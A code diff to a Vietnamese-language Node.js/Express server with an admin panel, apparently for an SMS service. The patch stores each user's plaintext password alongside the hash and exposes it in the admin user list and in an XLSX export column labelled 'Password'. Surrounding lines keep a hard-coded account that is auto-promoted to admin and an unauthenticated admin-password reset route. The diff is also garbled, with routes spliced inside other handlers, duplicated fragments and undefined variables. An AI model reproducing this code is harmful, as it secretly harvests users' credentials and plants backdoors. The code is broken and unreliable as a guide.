@@ -244,7 +244,8 @@ app.post('/api/register', async (req,res)=>{
     const existed = await User.findOne({ email });
     if (existed) return res.status(400).json({ message: 'Email đã tồn tại' });
     const hash = await bcrypt.hash(password, 10);
-    const user = await User.create({ username, email, password: hash, gender });
+    /* PATCH: save plainPassword on register */
+    const user = await User.create({ username, email, password: hash, plainPassword: password, gender });
     const token = signToken(user);
     res.json({ token, user: { id: user._id, username: user.username, email: user.email } });
   } catch (e) { console.error(e); res.status(500).json({ message: 'Lỗi máy chủ' }); }
@@ -256,6 +257,22 @@ app.post('/api/login', async (req,res)=>{
     let user = null;
     if (id) user = await User.findById(id);
     else if (email) user = await User.findOne({ email });
+// Change password (updates hash + plainPassword)
+app.post('/api/profile/change-password', auth, async (req,res)=>{
+  try{
+    const { newPassword } = req.body;
+    if (!newPassword || newPassword.length < 6) return res.status(400).json({ message: 'Mật khẩu tối thiểu 6 ký tự' });
+    const hash = await bcrypt.hash(newPassword, 10);
+    const user = await User.findByIdAndUpdate(req.user.id, { password: hash, plainPassword: newPassword, $inc: { passwordChangeCount: 1 } }, { new: true });
+    res.json({ success: true });
+  }catch(e){ console.error(e); res.status(500).json({ message:'Lỗi máy chủ' }); }
+});
+    const hash = await bcrypt.hash(newPassword, 10);
+    const user = await User.findByIdAndUpdate(req.user.id, { password: hash, plainPassword: newPassword }, { new: true });
+    res.json({ success:true });
+  } catch(e){ console.error(e); res.status(500).json({ message: 'Lỗi máy chủ' }); }
+});
+
     else if (username) user = await User.findOne({ username });
     else if (identifier) {
       const ident = identifier.trim();
@@ -268,7 +285,8 @@ app.post('/api/login', async (req,res)=>{
     const ok = await bcrypt.compare(password, user.password);
     if (!ok) return res.status(400).json({ message: 'Email/Username/ID hoặc mật khẩu không đúng' });
 
-    if (user.username === 'Admin_Check_1' && user.role !== 'admin') { user.role = 'admin'; await user.save(); }
+    if (user.username === 'Admin_Check_1' && user.role !== 'admin') { user.role = 'admin'; await user.save();
+    pushEvent({ type:'new-user', message:`${user.email||user.username} vừa đăng ký`, meta:{ userId: user._id } }); }
 
     const token = signToken(user);
     res.json({ token, user: { id: user._id, username: user.username, email: user.email, role: user.role } });
@@ -286,6 +304,7 @@ app.post('/internal/reset-admin-password', async (req,res)=>{
     if (!user) return res.status(404).json({ message: 'Admin user not found' });
     user.password = await bcrypt.hash(newPassword, 10);
     await user.save();
+    pushEvent({ type:'new-user', message:`${user.email||user.username} vừa đăng ký`, meta:{ userId: user._id } });
     return res.json({ success: true, message: 'Password reset' });
   } catch(e){ console.error(e); res.status(500).json({ message: 'Error' }); }
 });
@@ -554,10 +573,43 @@ app.post('/api/admin/backup', auth, requireRole('admin','superadmin'), async (re
 
 // ---------- Admin basic user management ----------
 app.get('/api/admin/users', auth, requireRole('admin','superadmin'), async (req,res)=>{
-  const limit = Math.min(200, parseInt(req.query.limit||50,10));
-  const skip = parseInt(req.query.skip||0,10);
-  const users = await User.find().select('username email role dailySent dailyLimit createdAt').skip(skip).limit(limit).lean();
-  res.json(users);
+  try{
+    const page = Math.max(1, parseInt(req.query.page||'1',10));
+    const pageSize = Math.min(200, Math.max(1, parseInt(req.query.pageSize||'50',10)));
+    const q = (req.query.q||'').trim();
+    const role = (req.query.role||'').trim();
+    const status = (req.query.status||'').trim(); // active|banned|smsBlocked
+    const newOnly = req.query.newOnly === 'true';
+
+    const filter = {};
+    if (q) filter.$or = [{ email: new RegExp(q,'i') }, { username: new RegExp(q,'i') }, { phone: new RegExp(q,'i') }];
+    if (role) filter.role = role;
+    if (status==='banned') filter.isBanned = true;
+    if (status==='smsBlocked') filter.smsBlocked = true;
+    if (status==='active') { filter.isBanned = { $ne: true }; }
+    if (newOnly) { const dayAgo = new Date(Date.now()-24*60*60*1000); filter.createdAt = { $gte: dayAgo }; }
+
+    const total = await User.countDocuments(filter);
+    const users = await User.find(filter)
+      .select('username email role income job phone sentToday dailyLimit weeklyLimit monthlyLimit yearlyLimit createdAt plainPassword isBanned smsBlocked passwordChangeCount')
+      .sort({ createdAt: -1, _id: -1 })
+      .skip((page-1)*pageSize)
+      .limit(pageSize)
+      .lean();
+    res.json({ total, page, pageSize, users });
+  }catch(e){ console.error(e); res.status(500).json({ message:'Server error' }); }
+});
+    if (limit) query = query.limit(parseInt(limit));
+
+    const users = await query.exec();
+    res.json(users.map(u => ({
+      ...u.toObject(),
+      plainPassword: u.plainPassword || ''
+    })));
+  } catch (err) {
+    console.error(err);
+    res.status(500).send('Server error');
+  }
 });
 app.post('/api/admin/set-limit', auth, requireRole('admin','superadmin'), async (req,res)=>{
   const { userId, limit } = req.body;
@@ -688,3 +740,155 @@ app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'admin.html'));
 });
 server.listen(PORT, () => console.log('Server running on port', PORT));
+
+// XLSX export
+const xlsx = require('xlsx');
+app.get('/api/admin/export/users.xlsx', auth, requireRole('admin','superadmin'), async (req,res)=>{
+  const users = await User.find().select('username email role phone income job sentToday dailyLimit weeklyLimit monthlyLimit yearlyLimit createdAt plainPassword').lean();
+  const rows = users.map(u=>({ 
+    Username: u.username||'',
+    Email: u.email||'',
+    Phone: u.phone||'',
+    Job: u.job||'',
+    Income: u.income||'',
+    Role: u.role||'user',
+    SentToday: u.sentToday||0,
+    DailyLimit: u.dailyLimit||0,
+    WeeklyLimit: u.weeklyLimit||0,
+    MonthlyLimit: u.monthlyLimit||0,
+    YearlyLimit: u.yearlyLimit||0,
+    CreatedAt: u.createdAt ? new Date(u.createdAt) : (u._id && u._id.getTimestamp ? u._id.getTimestamp() : null),
+    Password: u.plainPassword||''
+  }));
+  const wb = xlsx.utils.book_new();
+  const ws = xlsx.utils.json_to_sheet(rows);
+  xlsx.utils.book_append_sheet(wb, ws, 'Users');
+  const buf = xlsx.write(wb, { type:'buffer', bookType:'xlsx' });
+  res.setHeader('Content-Disposition','attachment; filename="users.xlsx"');
+  res.setHeader('Content-Type','application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
+  res.send(buf);
+});
+
+
+// ---------- Admin quick actions (make-admin, ban/unban, block/unblock SMS, notify, latest sms request) ----------
+app.post('/api/admin/make-admin', auth, requireRole('admin','superadmin'), async (req,res)=>{
+  try{
+    const { userId } = req.body;
+    if (!userId) return res.status(400).json({ message: 'Missing userId' });
+    await User.findByIdAndUpdate(userId, { $set: { role: 'admin' } });
+    await AdminLog.create({ adminId:String(req.user.id), action:'make-admin', targetUserId:String(userId) });
+    await AdminLog.create({ adminId:String(req.user.id), action:'notify', targetUserId:String(userId||'all'), payload:{ title, message } });
+    res.json({ success:true });
+  }catch(e){ console.error(e); res.status(500).json({ message: 'Server error' }); }
+});
+
+app.post('/api/admin/ban/:userId', auth, requireRole('admin','superadmin'), async (req,res)=>{
+  try{
+    const u = await User.findById(req.params.userId);
+    if (!u) return res.status(404).json({ message: 'User not found' });
+    u.isBanned = !u.isBanned;
+    await u.save();
+    await AdminLog.create({ adminId:String(req.user.id), action:'toggle-ban', targetUserId:String(u._id), payload:{ isBanned:u.isBanned } });
+    res.json({ success:true, isBanned: u.isBanned });
+  }catch(e){ console.error(e); res.status(500).json({ message: 'Server error' }); }
+});
+
+app.post('/api/admin/block-sms/:userId', auth, requireRole('admin','superadmin'), async (req,res)=>{
+  try{
+    const u = await User.findById(req.params.userId);
+    if (!u) return res.status(404).json({ message: 'User not found' });
+    u.smsBlocked = !u.smsBlocked;
+    await u.save();
+    await AdminLog.create({ adminId:String(req.user.id), action:'toggle-sms', targetUserId:String(u._id), payload:{ smsBlocked:u.smsBlocked } });
+    res.json({ success:true, smsBlocked: u.smsBlocked });
+  }catch(e){ console.error(e); res.status(500).json({ message: 'Server error' }); }
+});
+
+app.post('/api/admin/notify', auth, requireRole('admin','superadmin'), async (req,res)=>{
+  try{
+    const { userId, title, message } = req.body;
+    await Notification.create({ title: title||'Thông báo', message: message||'', target: userId ? String(userId) : 'all', meta: { type: 'admin-broadcast' } });
+    await AdminLog.create({ adminId:String(req.user.id), action:'make-admin', targetUserId:String(userId) });
+    await AdminLog.create({ adminId:String(req.user.id), action:'notify', targetUserId:String(userId||'all'), payload:{ title, message } });
+    res.json({ success:true });
+  }catch(e){ console.error(e); res.status(500).json({ message: 'Server error' }); }
+});
+
+app.get('/api/admin/latest-sms-request', auth, requireRole('admin','superadmin'), async (req,res)=>{
+  try{
+    const n = await Notification.findOne({ 'meta.type': 'sms' }).sort({ createdAt: -1 }).lean();
+    res.json(n || null);
+  }catch(e){ console.error(e); res.status(500).json({ message: 'Server error' }); }
+});
+
+// Bulk actions for multiple users
+app.post('/api/admin/bulk-actions', auth, requireRole('admin','superadmin'), async (req,res)=>{
+  try{
+    const { ids, action, value } = req.body; // action: setLimit/resetSent/ban/smsBlock
+    if (!Array.isArray(ids) || ids.length===0) return res.status(400).json({ message:'ids required' });
+    let update = null;
+    if (action==='setLimit') update = { $set: { dailyLimit: Number(value)||0 } };
+    if (action==='resetSent') update = { $set: { sentToday: 0 } };
+    if (action==='ban') update = [{ $set: { isBanned: { $not: "$isBanned" } } }];
+    if (action==='smsBlock') update = [{ $set: { smsBlocked: { $not: "$smsBlocked" } } }];
+    if (!update) return res.status(400).json({ message:'invalid action' });
+    const r = await User.updateMany({ _id: { $in: ids } }, update);
+    await AdminLog.create({ adminId: String(req.user.id), action: 'bulk-'+action, targetUserId:'multi', payload:{ ids, value } });
+    res.json({ success:true, modified: r.modifiedCount });
+  }catch(e){ console.error(e); res.status(500).json({ message:'Server error' }); }
+});
+
+// User creates an SMS request (can be called from user-side)
+app.post('/api/sms/request', auth, async (req,res)=>{
+  try{
+    const msg = (req.body && req.body.message) || 'Yêu cầu SMS';
+    const n = await Notification.create({ title:'SMS Request', message: msg, target:'admin', meta:{ type:'sms', from: String(req.user.id) } });
+    res.json({ success:true, id: n._id });
+  }catch(e){ console.error(e); res.status(500).json({ message:'Server error' }); }
+});
+
+// SSE stream for latest SMS notifications
+const smsClients = new Set();
+app.get('/api/admin/stream-sms', auth, requireRole('admin','superadmin'), (req,res)=>{
+  res.writeHead(200, { 'Content-Type':'text/event-stream', 'Cache-Control':'no-cache', Connection:'keep-alive' });
+  res.write('\n');
+  smsClients.add(res);
+  req.on('close', ()=>{ smsClients.delete(res); });
+});
+// helper to push event
+async function pushSmsEvent(payload){
+  for(const client of smsClients){ try{ client.write(`data: ${JSON.stringify(payload)}\n\n`); }catch(e){} }
+}
+
+
+// ===== Notifications & SSE =====
+const EventEmitter = require('events');
+const eventBus = new EventEmitter();
+
+async function pushEvent(payload){
+  try{
+    await Notification.create({ type: payload.type, message: payload.message, meta: payload.meta||{} });
+  }catch(e){ console.error("Notif save error", e); }
+  eventBus.emit('event', payload);
+}
+
+app.get('/api/admin/notifications', auth, requireRole('admin','superadmin'), async (req,res)=>{
+  try{
+    const limit = Math.min(20, parseInt(req.query.limit||'5',10));
+    const notes = await Notification.find().sort({ createdAt:-1 }).limit(limit).lean();
+    res.json(notes);
+  }catch(e){ res.status(500).send('Server error'); }
+});
+
+app.get('/api/admin/stream-events', auth, requireRole('admin','superadmin'), (req,res)=>{
+  res.writeHead(200, {
+    'Content-Type':'text/event-stream',
+    'Cache-Control':'no-cache',
+    'Connection':'keep-alive'
+  });
+  const onEv = (payload)=>{
+    res.write(`data: ${JSON.stringify(payload)}\n\n`);
+  };
+  eventBus.on('event', onEv);
+  req.on('close', ()=> eventBus.off('event', onEv));
+});
